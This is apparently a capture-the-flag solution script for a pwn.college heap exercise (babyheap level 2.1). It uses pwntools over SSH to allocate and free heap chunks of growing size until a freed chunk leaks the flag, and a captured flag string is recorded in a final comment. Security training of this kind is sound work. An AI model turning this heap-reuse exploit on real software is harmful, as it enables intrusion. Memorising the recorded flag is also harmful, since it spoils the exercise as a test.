from pwn import *

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

size = 0x80
io = s.process("/challenge/babyheap_level2.1")
while 1:
    io.sendlineafter(b": ", b"malloc")
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b": ", b"free")
    io.sendlineafter(b": ", b"read_flag")
    io.sendlineafter(b": ", b"puts")

    io.recvuntil(b'Data: ')
    flag = io.recvline().decode()
    if 'pwn.college' in flag:
        info("Flag: " + flag)
        exit()
    size += 16

# Flag: pwn.college{gL3aFwtRq3OiqatWHvwSh4d9_az.0FN3MDLxIjNyEzW}